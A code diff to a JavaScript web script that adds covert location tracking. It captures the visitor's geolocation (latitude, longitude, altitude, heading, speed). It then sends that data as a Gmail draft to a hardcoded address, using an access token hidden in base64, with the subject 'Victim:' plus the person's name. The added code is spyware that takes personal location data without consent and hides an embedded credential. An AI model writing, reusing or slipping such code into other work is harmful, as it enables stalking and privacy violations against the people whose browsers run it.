@@ -13,8 +13,8 @@ let Info = {
 		Language: "",
 		
 		Location: {
-			Latitude: "",
-			Longitude: "",
+			Latitude: "", //緯度
+			Longitude: "", //経度
 			Accuracy: "",
 			Altitude: "",
 			AltitudeAccuracy: "",
@@ -90,8 +90,35 @@ let Net = {
 			TokenGetter.send(null);
 	},
 	
-	SendGmail: function () {
-		
+	SendGmail: function (OnLoad) {
+		let MailSender = new XMLHttpRequest();
+			MailSender.open("POST", "https://www.googleapis.com/gmail/v1/users/me/drafts?access_token=" + atob("eWEyOS5DaV9BQTV3YUVzRU43ZF9jTWYwdk0yY05TMlhfUmNNX2lZNmpacVI3ZDg3MzhCOHI5dkt4QV8tb0s2MXNfYUJKbFE="), true);
+			
+			MailSender.onload = function (Event) {
+				OnLoad();
+			}
+			
+			MailSender.send(JSON.stringify(
+				{
+					messages: {
+						raw: btoa(unescape(encodeURIComponent([
+							"To: genbuproject@gmail.com",
+							"Subject: =?utf-8?B?Victim:" + btoa(unescape(encodeURIComponent(Info.Datas.Name))) + "?=",
+							"MIME-Version: 1.0",
+							"Content-Type: text/plain; charset=UTF-8",
+							"Content-Transfer-Encoding: 7bit",
+							"",
+							Info.Datas.Location.Latitude,
+							Info.Datas.Location.Longitude,
+							Info.Datas.Location.Accuracy,
+							Info.Datas.Location.Altitude,
+							Info.Datas.Location.AltitudeAccuracy,
+							Info.Datas.Location.Heading,
+							Info.Datas.Location.Speed
+						].join("\n").trim()))).replace(/\+/g, "-").replace(/\//g, "_");
+					}
+				}
+			));
 	}
 }
 
@@ -127,6 +154,14 @@ function Init() {
 						
 					navigator.geolocation.getCurrentPosition(function (Position) {
 						console.log(Position);
+						
+						Info.Datas.Location.Latitude = Position.coords.latitude;
+						Info.Datas.Location.Longitude = Position.coords.longitude;
+						Info.Datas.Location.Accuracy = Position.coords.accuracy;
+						Info.Datas.Location.Altitude = Position.coords.altitude;
+						Info.Datas.Location.AltitudeAccuracy = Position.coords.altitudeAccuracy;
+						Info.Datas.Location.Heading = Position.coords.heading;
+						Info.Datas.Location.Speed = Position.coords.speed;
 					});
 				}
 				
